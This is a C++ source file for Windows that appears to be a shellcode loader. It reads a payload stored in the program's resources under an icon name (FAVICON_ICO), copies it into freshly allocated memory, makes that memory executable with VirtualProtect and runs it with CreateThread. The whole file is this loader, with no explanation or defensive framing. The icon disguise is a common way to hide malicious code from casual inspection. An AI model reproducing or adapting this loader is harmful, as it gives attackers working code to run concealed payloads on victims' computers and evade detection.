#include <Windows.h>
#include <iostream>
#include "resource.h"

int main()
{
    HRSRC res;
    HGLOBAL reshandle;
    char* payload;
    int payload_len;
    LPVOID exec_memory;
    DWORD oldprotection = PAGE_READWRITE;

    //Extract payload from .rscr section
    res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
    reshandle = LoadResource(NULL, res);
    payload = (char*) LockResource(reshandle);
    payload_len = SizeofResource(NULL, res);

    //Allocate memory buffer for the payload
    exec_memory = VirtualAlloc(NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    std::cout << (void*)exec_memory;

    //Copy the payload into the buffer
    RtlMoveMemory(exec_memory, payload, payload_len);

    //Change the buffer permission
    VirtualProtect(exec_memory, payload_len, PAGE_EXECUTE_READ, &oldprotection);

    //Create thread and execute the payload
    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)exec_memory, NULL, NULL, NULL);
    
    return EXIT_SUCCESS;

}

